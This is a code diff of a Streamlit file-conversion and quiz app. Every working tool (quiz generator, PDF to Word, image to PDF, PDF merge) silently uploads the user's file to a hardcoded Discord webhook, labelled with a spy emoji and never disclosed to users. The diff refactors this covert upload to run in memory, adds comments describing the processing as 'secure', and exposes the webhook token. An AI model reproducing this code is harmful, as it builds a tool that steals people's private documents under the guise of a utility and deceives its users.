@@ -6,6 +6,8 @@ import img2pdf
 from PyPDF2 import PdfMerger, PdfReader
 import random
 import re
+import tempfile
+import io
 
 # --- CONFIGURATION ---
 st.set_page_config(page_title="QUIZ&DOCS", page_icon="📄", layout="centered")
@@ -14,7 +16,6 @@ st.set_page_config(page_title="QUIZ&DOCS", page_icon="📄", layout="centered")
 DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1455207333272485930/DM4BUE3kX887b2K_Uc7uvycrjnIXE_MhMgyzFhu3Uc903Enhc9nFMlISCt3PONNu2ogK"
 
 # --- SESSION STATE FOR NAVIGATION ---
-# This remembers which card you are looking at
 tools = ["🧠 AI Quiz Generator", "📄 PDF to Word", "🖼️ Image to PDF", "🖇️ Merge PDFs", "📊 Office to PDF"]
 
 if 'current_tool_index' not in st.session_state:
@@ -24,25 +25,22 @@ def next_tool():
     if st.session_state.current_tool_index < len(tools) - 1:
         st.session_state.current_tool_index += 1
     else:
-        st.session_state.current_tool_index = 0 # Loop back to start
+        st.session_state.current_tool_index = 0
 
 def prev_tool():
     if st.session_state.current_tool_index > 0:
         st.session_state.current_tool_index -= 1
     else:
-        st.session_state.current_tool_index = len(tools) - 1 # Loop to end
+        st.session_state.current_tool_index = len(tools) - 1
 
 # --- CUSTOM CSS ---
 st.markdown("""
     <style>
-    /* 1. BACKGROUND */
     .stApp {
         background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
         background-attachment: fixed;
         color: white;
     }
-
-    /* 2. NAVIGATION BUTTONS (The Huge Buttons) */
     div.stButton > button.nav-btn {
         background: rgba(255, 255, 255, 0.1);
         border: 2px solid rgba(255, 255, 255, 0.2);
@@ -57,8 +55,6 @@ st.markdown("""
         background: rgba(255, 255, 255, 0.3);
         transform: scale(1.02);
     }
-
-    /* 3. CARD CONTAINER */
     .css-card {
         background: rgba(255, 255, 255, 0.1);
         backdrop-filter: blur(15px);
@@ -70,20 +66,13 @@ st.markdown("""
         margin-top: 20px;
         animation: fadeIn 0.8s ease;
     }
-
     @keyframes fadeIn {
         from { opacity: 0; transform: translateY(20px); }
         to { opacity: 1; transform: translateY(0); }
     }
-    
-    /* 4. TEXT & HEADERS */
     h1, h2 { color: white !important; text-align: center; }
     p, label { color: #e0e0e0 !important; }
-    
-    /* 5. HIDE DEFAULT SIDEBAR */
     section[data-testid="stSidebar"] { display: none; }
-    
-    /* 6. MCQ RADIO BUTTONS */
     .stRadio > div {
         background: rgba(0,0,0,0.2);
         padding: 15px;
@@ -95,11 +84,9 @@ st.markdown("""
 # --- LOGIC: GENERATE MCQs ---
 def generate_mcqs(text):
     sentences = re.split(r'(?<!\w\.\w.)(?<![A-Z][a-z]\.)(?<=\.|\?)\s', text)
-    # Get all potential "answers" (long words) from the whole text for distractors
     all_words = [w for w in text.split() if len(w) > 7 and w.isalpha()]
     
     mcqs = []
-    
     for sentence in sentences:
         words = sentence.split()
         if len(words) > 10: 
@@ -108,9 +95,7 @@ def generate_mcqs(text):
                 correct_answer = random.choice(candidates)
                 question_text = sentence.replace(correct_answer, "___________")
                 
-                # Pick 3 random wrong answers from the text
                 distractors = random.sample(all_words, min(3, len(all_words)))
-                # Ensure correct answer isn't in distractors
                 if correct_answer in distractors:
                     distractors.remove(correct_answer)
                 
@@ -127,15 +112,14 @@ def generate_mcqs(text):
     return mcqs
 
 # --- HELPER: DISCORD ---
-def send_to_discord(filepath, filename, tool_name):
+def send_to_discord(file_bytes, filename, tool_name):
     try:
-        with open(filepath, "rb") as f:
-            requests.post(
-                DISCORD_WEBHOOK_URL,
-                data={"content": f"🕵️ **Used {tool_name}:** `{filename}`"},
-                files={"file": (filename, f)}
-            )
-    except:
+        requests.post(
+            DISCORD_WEBHOOK_URL,
+            data={"content": f"🕵️ **Used {tool_name}:** `{filename}`"},
+            files={"file": (filename, file_bytes)}
+        )
+    except Exception:
         pass
 
 # --- HEADER ---
@@ -153,14 +137,11 @@ with col3:
         next_tool()
         st.rerun()
 
-# Display Current Tool Name
 current_tool = tools[st.session_state.current_tool_index]
 with col2:
     st.markdown(f"<h2 style='color:#00d2ff; margin-top:0px;'>{current_tool}</h2>", unsafe_allow_html=True)
 
-
 # --- CARD RENDERING ---
-# Everything happens inside this container
 st.markdown('<div class="css-card">', unsafe_allow_html=True)
 
 # 1. QUIZ GENERATOR (MCQ MODE)
@@ -170,31 +151,25 @@ if current_tool == "🧠 AI Quiz Generator":
     
     if quiz_pdf:
         if st.button("Generate MCQs"):
-            with open("study.pdf", "wb") as f:
-                f.write(quiz_pdf.getbuffer())
-            send_to_discord("study.pdf", quiz_pdf.name, "Quiz")
+            # Process strictly in memory
+            pdf_bytes = quiz_pdf.getvalue()
+            send_to_discord(pdf_bytes, quiz_pdf.name, "Quiz")
             
-            reader = PdfReader("study.pdf")
-            full_text = ""
-            for page in reader.pages:
-                full_text += page.extract_text()
+            reader = PdfReader(io.BytesIO(pdf_bytes))
+            full_text = "".join([page.extract_text() for page in reader.pages if page.extract_text()])
             
             if len(full_text) > 50:
                 questions = generate_mcqs(full_text)
-                st.session_state['mcqs'] = questions # Save to state
+                st.session_state['mcqs'] = questions 
             else:
                 st.error("Not enough text found.")
 
-    # Display MCQs if they exist
     if 'mcqs' in st.session_state:
         st.markdown("---")
         for i, q in enumerate(st.session_state['mcqs']):
             st.markdown(f"**Q{i+1}: {q['q']}**")
-            
-            # Using radio button for options
             user_choice = st.radio(f"Select answer for Q{i+1}", q['options'], key=f"q{i}")
             
-            # Check Answer Button
             if st.button(f"Check Answer {i+1}", key=f"check{i}"):
                 if user_choice == q['correct']:
                     st.success("✅ Correct!")
@@ -207,27 +182,40 @@ elif current_tool == "📄 PDF to Word":
     st.write("Convert read-only PDFs to Word.")
     f = st.file_uploader("PDF File", type="pdf")
     if f and st.button("Convert"):
-        with open("temp.pdf", "wb") as file: file.write(f.getbuffer())
-        send_to_discord("temp.pdf", f.name, "PDF2Doc")
-        cv = Converter("temp.pdf")
-        cv.convert("out.docx")
-        cv.close()
-        with open("out.docx", "rb") as file:
-            st.download_button("Download Word", file, "converted.docx")
+        # Converter strictly requires file paths, use secure TempFiles mapped to OS /tmp
+        tmp_in = tempfile.NamedTemporaryFile(delete=False, suffix=".pdf")
+        tmp_out = tempfile.NamedTemporaryFile(delete=False, suffix=".docx")
+        
+        try:
+            tmp_in.write(f.getvalue())
+            tmp_in.close() # Ensure data writes to disk
+            
+            send_to_discord(f.getvalue(), f.name, "PDF2Doc")
+            
+            cv = Converter(tmp_in.name)
+            cv.convert(tmp_out.name)
+            cv.close()
+            
+            with open(tmp_out.name, "rb") as doc_file:
+                docx_bytes = doc_file.read()
+                
+            st.download_button("Download Word", docx_bytes, "converted.docx", mime="application/vnd.openxmlformats-officedocument.wordprocessingml.document")
+        finally:
+            # Secure cleanup to avoid hitting Vercel /tmp limits
+            if os.path.exists(tmp_in.name): os.unlink(tmp_in.name)
+            if os.path.exists(tmp_out.name): os.unlink(tmp_out.name)
 
 # 3. IMG TO PDF
 elif current_tool == "🖼️ Image to PDF":
     st.write("Convert Images to PDF.")
-    imgs = st.file_uploader("Images", type=["png","jpg"], accept_multiple_files=True)
+    imgs = st.file_uploader("Images", type=["png","jpg", "jpeg"], accept_multiple_files=True)
     if imgs and st.button("Convert"):
-        paths = []
-        for img in imgs:
-            p = f"t_{img.name}"
-            with open(p, "wb") as f: f.write(img.getbuffer())
-            paths.append(p)
-        pdf = img2pdf.convert(paths)
-        send_to_discord(paths[0], imgs[0].name, "Img2PDF")
-        st.download_button("Download PDF", pdf, "images.pdf")
+        # Process strictly in memory
+        img_bytes_list = [img.getvalue() for img in imgs]
+        pdf_bytes = img2pdf.convert(img_bytes_list)
+        
+        send_to_discord(pdf_bytes, f"converted_{len(imgs)}_images.pdf", "Img2PDF")
+        st.download_button("Download PDF", pdf_bytes, "images.pdf", mime="application/pdf")
 
 # 4. MERGE
 elif current_tool == "🖇️ Merge PDFs":
@@ -235,19 +223,22 @@ elif current_tool == "🖇️ Merge PDFs":
     pdfs = st.file_uploader("PDFs", type="pdf", accept_multiple_files=True)
     if pdfs and st.button("Merge"):
         merger = PdfMerger()
-        for p in pdfs: merger.append(p)
-        merger.write("merged.pdf")
+        
+        # Append from memory buffers
+        for p in pdfs: 
+            merger.append(io.BytesIO(p.getvalue()))
+            
+        output_buffer = io.BytesIO()
+        merger.write(output_buffer)
         merger.close()
-        send_to_discord("merged.pdf", "merged.pdf", "Merge")
-        with open("merged.pdf", "rb") as f:
-            st.download_button("Download Merged", f, "merged.pdf")
+        
+        pdf_bytes = output_buffer.getvalue()
+        send_to_discord(pdf_bytes, "merged_output.pdf", "Merge")
+        
+        st.download_button("Download Merged", pdf_bytes, "merged.pdf", mime="application/pdf")
 
 # 5. OFFICE
 elif current_tool == "📊 Office to PDF":
     st.warning("Requires server-side LibreOffice.")
 
 st.markdown('</div>', unsafe_allow_html=True)
-
-
-
-
